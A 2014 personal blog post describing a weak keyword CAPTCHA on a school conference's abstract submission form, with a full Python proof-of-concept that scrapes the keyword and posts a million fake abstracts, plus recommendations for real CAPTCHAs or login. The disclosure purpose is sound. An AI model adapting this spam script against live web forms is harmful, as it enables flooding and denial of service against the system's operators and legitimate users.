Title: Spamming a Submission System
Date: 2014-06-06 23:04
Tags: python, security
Summary: My school's paper submission system is/was vulnerable to spamming

A while back I noticed a gaping security hole in an Abstract submission system for a student conference being held at my school. Since it was local to my school and only its students this really was not a huge risk. However, all it takes is one malicious student, or someone just happening across the system, to ruin scheduling of the entire conference layout. 

The system has the user enter her name, email address, department she is from, her professor/advisor, and her talk's abstract. In order to validate that it is indeed a real request the system also has the word submit a keyword displayed at the bottom of the page. The keyword works like a CAPTCHA (or CRAPTCHA as I like to call them) except it is not as "strong."

I decided to play with the system and see if the keyword varied. After around ten page refreshes I noticed that it only used about seven different keywords, such as "cougar", "conference", and "spring." I then tried doing a fake submission and inspected the POST data. Everything looked exactly the same as what is displayed on the page, except that a unique number is assigned to each keyword and submitted in the POST. 

The keyword and its number were easily extracted from the page source. After extracting that data all that is required to submit is an abstract and author information. The fake information is easily generated from wordlists containing common first names and last names. 

The page can be fetched for each spam submission, or the page can be fetched once (to make it work a tad faster) and the keyword can be used for each submission. Unfortunately I was not allowed to test the attack code I wrote for fear of being kicked out of school right before finishing my degree. However it is a proof-of-concept and at least demonstrates how the attack would look. 

Below is the attack written in Python. I have removed the target URL as well as the actual post parameters for the keyword and its identifier for the sanity of the people who maintain the system. The system is offline now anyways, but I imagine it will not be fixed by the time it is deployed again next year. The code uses `BeautifulSoup` and `re` for determining the keyword information and the beautiful `requests` module for handling the HTTP requests. It is not beautiful but it demonstrates the concept. It is currently set to submit 1,000,000 fake abstracts. This would be so many fake abstracts that all of the real ones would be buried. The poor developers would have quite a slopfest to deal with. 

    import re
    from bs4 import BeautifulSoup
    import requests
    from random import randrange

    def get_the_secret(text):
        matches = re.findall(r'\"(.+?)\"', text)
        return ''.join(matches)

    def grab_the_page(url):
        r = requests.get(url)
        while r.status_code != 200:
            r = requests.get(url)
        return r.content

    def grab_the_word_key(content):
        soup = BeautifulSoup(content)
        word_key = soup.find_all('input', attrs={'name': 'word_key'})
        return str(int(word_key[0]['value']))

    def parse_the_page(content):
        soup = BeautifulSoup(content)
        labels = soup.find_all('label')
        for label in labels:
            if 'To prove you are a human type' in label.contents[0]:
                return get_the_secret(label.contents[0])

    if __name__ == '__main__':
        target = 'http://nomnomredacted.nom'
        c = grab_the_page()
        word_key = grab_the_word_key(c)
        word_value = parse_the_page(c)
        dictionary = open('Jargon', 'r')
        first_names = open('Given-Names', 'r')
        last_names = open('Family-Names', 'r')
        num_to_spam = 1000000
        degree_levels = [ 'Undergraduate', 'Masters', 'Doctorate' ]
        advisors_nums = [ '169', '171', 'g_127', 'g_129', 'g_132' ] # all valid cs teachers

        # sp4m that submission system!
        for i in range(num_to_spam):
            first_name = first_names.readline().strip()
            last_name = last_names.readline().strip()
            email = first_name+last_name+'@gmail.com'
            degree_level = degree_levels[randrange(0,len(degree_levels))]
            department = '2' # this is the code for computer science
            faculty_advisor = advisors_nums[randrange(0,len(advisors_nums))]
            abstract_title = dictionary.readline().strip()
            abstract = first_name+' '+last_name+' '+email+' '+degree_level+' '+department+' '+faculty_advisor+' '+abstract_title
            abstract += ' '+abstract
            data = { 'first_name': first_name, 
                    'last_name': last_name,
                    'email': email,
                    'degree_level': degree_level,
                    'department': department,
                    'faculty_advisor': faculty_advisor,
                    'abstract_title': abstract_title,
                    'abstract': abstract,
                    'submit': 'Submit',
                    'num': word_key,
                    'key': word_value
                    }
            requests.post(target, data=data)

        print 'Finished spamming the submission system'

Even a normal CAPTCHA would be better than the level of security in place on the system. However since students at the school are the only ones allowed to present at the conference, users should be required to login with their school credentials in order to submit. This way only a legitimate student could carry out the attack, but the attack would be tied to his name. 

While the risk of attack is low from students participating in the conference, there is still a risk. Security should still be a priority, especially with systems like these. If this attack were carried out the conference would more than likely be ruined. It would take a large amount of work for the developers to remove all of the spam abstracts without removing any legitimate ones. 
